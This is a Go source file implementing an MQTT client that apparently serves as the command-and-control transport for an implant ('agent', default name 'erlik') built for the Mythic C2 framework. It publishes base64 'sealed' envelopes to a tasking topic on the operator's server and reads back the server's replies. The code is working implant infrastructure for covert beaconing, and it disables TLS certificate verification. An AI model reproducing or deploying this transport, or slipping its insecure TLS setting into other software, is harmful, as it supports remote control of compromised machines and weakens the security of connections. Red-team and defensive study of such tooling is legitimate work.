package main

import (
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"strings"
	"time"
)

// Minimal MQTT 3.1.1 client (OASIS standard), stdlib-only: CONNECT, SUBSCRIBE,
// PUBLISH qos1, DISCONNECT over TCP or TLS. One connection per exchange
// matches the agent's stateless poll loop and skips keepalive/PING bookkeeping.
//
// Wire contract with the Mythic mqtt profile: agent publishes the base64
// envelope to base+mqtt_taskcheck and reads the Mythic reply from a PUBLISH
// on base+mqtt_mythic.
type mqttTransport struct {
	addr     string
	useSSL   bool
	clientID string
	user     string
	pass     string
	pubTopic string
	subTopic string
}

func newMQTTTransport(c Config) (*mqttTransport, error) {
	if c.MqttServer == "" {
		return nil, fmt.Errorf("mqtt_server is empty")
	}
	port := atoiOr(c.MqttPort, 8883)
	useSSL := strings.EqualFold(c.MqttUseSSL, "true")
	base := c.MqttClient
	if base == "" {
		base = "erlik"
	}
	var suffix [4]byte
	if _, err := rand.Read(suffix[:]); err != nil {
		return nil, err
	}
	return &mqttTransport{
		addr:     fmt.Sprintf("%s:%d", c.MqttServer, port),
		useSSL:   useSSL,
		clientID: base + "-" + hex.EncodeToString(suffix[:]),
		user:     c.MqttUser,
		pass:     c.MqttPass,
		pubTopic: c.MqttTopic + c.MqttTaskcheck,
		subTopic: c.MqttTopic + c.MqttMythic,
	}, nil
}

func (t *mqttTransport) exchange(sealed []byte) ([]byte, error) {
	conn, err := net.DialTimeout("tcp", t.addr, 15*time.Second)
	if err != nil {
		return nil, err
	}
	if t.useSSL {
		conn = tls.Client(conn, &tls.Config{InsecureSkipVerify: true}) //nolint:gosec
		if err := conn.(*tls.Conn).Handshake(); err != nil {
			conn.Close()
			return nil, err
		}
	}
	defer conn.Close()
	if err := conn.SetDeadline(time.Now().Add(60 * time.Second)); err != nil {
		return nil, err
	}
	if err := t.connect(conn); err != nil {
		return nil, err
	}
	if err := t.subscribe(conn); err != nil {
		return nil, err
	}
	body := base64.StdEncoding.EncodeToString(sealed)
	if err := t.publish(conn, body); err != nil {
		return nil, err
	}
	resp, err := t.waitReply(conn)
	if err != nil {
		return nil, err
	}
	mqttWrite(conn, 0xE0, nil) // DISCONNECT, best effort
	raw, err := base64.StdEncoding.DecodeString(resp)
	if err != nil {
		return nil, fmt.Errorf("mqtt reply: %w", err)
	}
	return raw, nil
}

func (t *mqttTransport) connect(conn net.Conn) error {
	var flags byte = 0x02 // clean session
	body := []byte{0x00, 0x04, 'M', 'Q', 'T', 'T', 0x04, 0x00, 0x00, 0x3C}
	if t.user != "" {
		flags |= 0x80
	}
	if t.pass != "" {
		flags |= 0x40
	}
	body[7] = flags
	body = append(body, mqttString(t.clientID)...)
	if t.user != "" {
		body = append(body, mqttString(t.user)...)
	}
	if t.pass != "" {
		body = append(body, mqttString(t.pass)...)
	}
	if err := mqttWrite(conn, 0x10, body); err != nil {
		return err
	}
	fixed, resp, err := mqttRead(conn)
	if err != nil {
		return err
	}
	if fixed != 0x20 || len(resp) != 2 || resp[1] != 0x00 {
		return fmt.Errorf("mqtt CONNACK rejected: fixed=%02x resp=%x", fixed, resp)
	}
	return nil
}

func (t *mqttTransport) subscribe(conn net.Conn) error {
	body := []byte{0x00, 0x01} // packet id 1
	body = append(body, mqttString(t.subTopic)...)
	body = append(body, 0x01) // qos 1
	if err := mqttWrite(conn, 0x82, body); err != nil {
		return err
	}
	fixed, resp, err := mqttRead(conn)
	if err != nil {
		return err
	}
	if fixed != 0x90 || len(resp) != 3 || resp[2] == 0x80 {
		return fmt.Errorf("mqtt SUBACK rejected: fixed=%02x resp=%x", fixed, resp)
	}
	return nil
}

func (t *mqttTransport) publish(conn net.Conn, body string) error {
	pkt := mqttString(t.pubTopic)
	pkt = append(pkt, 0x00, 0x02) // packet id 2, qos 1
	pkt = append(pkt, body...)
	if err := mqttWrite(conn, 0x32, pkt); err != nil {
		return err
	}
	fixed, resp, err := mqttRead(conn)
	if err != nil {
		return err
	}
	if fixed != 0x40 || len(resp) != 2 || resp[0] != 0x00 || resp[1] != 0x02 {
		return fmt.Errorf("mqtt PUBACK missing: fixed=%02x resp=%x", fixed, resp)
	}
	return nil
}

// waitReply reads packets until a PUBLISH on the reply topic arrives.
func (t *mqttTransport) waitReply(conn net.Conn) (string, error) {
	for {
		fixed, body, err := mqttRead(conn)
		if err != nil {
			return "", err
		}
		if fixed&0xF0 != 0x30 {
			continue
		}
		qos := (fixed & 0x06) >> 1
		if len(body) < 2 {
			return "", fmt.Errorf("mqtt PUBLISH too short")
		}
		tlen := int(binary.BigEndian.Uint16(body))
		if len(body) < 2+tlen {
			return "", fmt.Errorf("mqtt PUBLISH topic truncated")
		}
		topic := string(body[2 : 2+tlen])
		rest := body[2+tlen:]
		if qos == 1 {
			if len(rest) < 2 {
				return "", fmt.Errorf("mqtt PUBLISH id truncated")
			}
			mqttWrite(conn, 0x40, rest[:2]) // PUBACK, best effort
			rest = rest[2:]
		}
		if topic != t.subTopic {
			continue
		}
		return string(rest), nil
	}
}

func mqttString(s string) []byte {
	out := make([]byte, 2+len(s))
	binary.BigEndian.PutUint16(out, uint16(len(s)))
	copy(out[2:], s)
	return out
}

func mqttWrite(w io.Writer, fixed byte, body []byte) error {
	n := len(body)
	var hdr []byte
	for {
		b := byte(n % 128)
		n /= 128
		if n > 0 {
			b |= 0x80
		}
		hdr = append(hdr, b)
		if n == 0 {
			break
		}
	}
	if _, err := w.Write(append([]byte{fixed}, hdr...)); err != nil {
		return err
	}
	_, err := w.Write(body)
	return err
}

func mqttRead(r io.Reader) (byte, []byte, error) {
	var fh [1]byte
	if _, err := io.ReadFull(r, fh[:]); err != nil {
		return 0, nil, err
	}
	n, mult := 0, 1
	for i := 0; i < 4; i++ {
		var b [1]byte
		if _, err := io.ReadFull(r, b[:]); err != nil {
			return 0, nil, err
		}
		n += int(b[0]&0x7F) * mult
		if b[0]&0x80 == 0 {
			break
		}
		mult *= 128
	}
	body := make([]byte, n)
	_, err := io.ReadFull(r, body)
	return fh[0], body, err
}
